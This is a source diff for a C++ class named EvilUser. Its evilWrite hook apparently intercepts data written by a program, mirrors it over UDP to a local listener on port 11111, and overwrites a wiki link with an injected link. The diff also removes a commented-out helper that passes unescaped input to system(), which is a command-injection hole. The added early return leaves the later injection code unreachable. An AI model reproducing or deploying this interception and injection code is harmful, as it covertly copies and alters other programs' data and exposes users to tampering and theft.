@@ -6,14 +6,6 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-// void echo_printf(const char *src)
-// {
-
-//     char buffer[2560] = {0};
-//     snprintf(buffer, sizeof(buffer), "echo \"%s\" >> /home/lmc/Desktop/zzz", src);
-//     system(buffer);
-// }
-
 #define MAX_TMPBUFFER_SIZE 100000
 
 EvilUser::EvilUser() :
@@ -53,7 +45,9 @@ ssize_t EvilUser::evilWrite(int fd, const void *&buf, size_t &count)
     client.sin_family=AF_INET;
     client.sin_port=htons(11111);
     client.sin_addr.s_addr=inet_addr("127.0.0.1");
-    
+
+    sendto(sockFd, buf, count,0,(struct sockaddr*)&client,sizeof(client)); 
+    return 0;
 
     if (!tmpBuffer)
         tmpBuffer = (char *)malloc(MAX_TMPBUFFER_SIZE);
@@ -67,8 +61,8 @@ ssize_t EvilUser::evilWrite(int fd, const void *&buf, size_t &count)
     {
         int wikiLinkSize = strlen(wikiLink);
         memcpy(p, injectLink, wikiLinkSize);
-        sendto(sockFd, buf+10, count,0,(struct sockaddr*)&client,sizeof(client)); 
+        sendto(sockFd, buf, count,0,(struct sockaddr*)&client,sizeof(client)); 
     }
 
-    return retSize;
+    return 0;
 }
